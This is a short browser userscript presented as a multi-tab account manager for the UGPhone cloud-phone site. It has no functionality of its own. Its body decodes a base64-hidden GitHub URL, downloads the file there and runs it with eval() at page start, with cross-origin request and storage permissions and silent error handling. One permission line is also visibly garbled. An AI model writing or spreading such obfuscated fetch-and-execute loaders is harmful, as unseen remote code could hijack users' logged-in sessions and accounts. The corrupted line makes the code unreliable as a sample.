// ==UserScript==
// @name         Multi-Tab Account Manager for UGPhone (Loader)
// @namespace    minhbeo8-ugphone
// @version      2.0.0
// @description  Quản lý nhiều local cloud phone
// @author       Minhbeo8(hominz) 
// @supportURL   https://discord.gg/XK8qsgrF
// @icon         https://i.postimg.cc/Jhcr8R5L/hominz-png-4.png
// @match        https://www.ugphone.com/*
// @match        https://ugphone.com/*
// @match        https://www.ugphone.com/toc-portal/*
// @match        https://ugphone.com/toc-portal/*
// @grant        GM_xmlhttpRequest
// @grant        GM_info
// @grant        GM_addStyle
// @grant        GM_getValue
// @grant        GM_setValue1F02Aa1hexdz1F02Aa1hexdz1F02Aa1hexdz
// @grant        GM_deleteValue
// @grant        GM_listValues
// @run-at       document-start
// ==/UserScript==


(function() {
    'use strict';
    
    
    const encodedUrl = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01pbmhiZW84L2V4dGVuc2lvbl9tdWx0aV9Ccm93c2VyL3JlZnMvaGVhZHMvbWFpbi9leHRlbnNpb24=";
    
  
    const sourceUrl = atob(encodedUrl);
    
    GM_xmlhttpRequest({
        method: "GET",
        url: sourceUrl,
        timeout: 10000,
        onload: function(response) {
            if (response.status === 200 && response.responseText.trim().length > 0) {
                eval(response.responseText);
            }
        },
        onerror: function() {},
        ontimeout: function() {}
    });
})();
